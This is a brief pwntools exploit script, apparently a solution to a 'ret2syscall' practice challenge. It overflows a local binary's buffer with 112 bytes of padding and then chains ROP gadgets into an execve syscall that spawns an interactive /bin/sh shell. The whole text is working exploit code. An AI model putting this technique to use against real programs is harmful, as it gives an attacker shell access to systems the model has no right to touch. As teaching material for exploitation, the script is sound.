from pwn import *

sh = process('./ret2syscall')
# 0x080bb196 : pop eax ; ret
pop_eax_ret = 0x080bb196
# 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx_ret = 0x0806eb90
# 0x08049421 : int 0x80
int_0x80 = 0x08049421
# 0x080be408 : /bin/sh
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()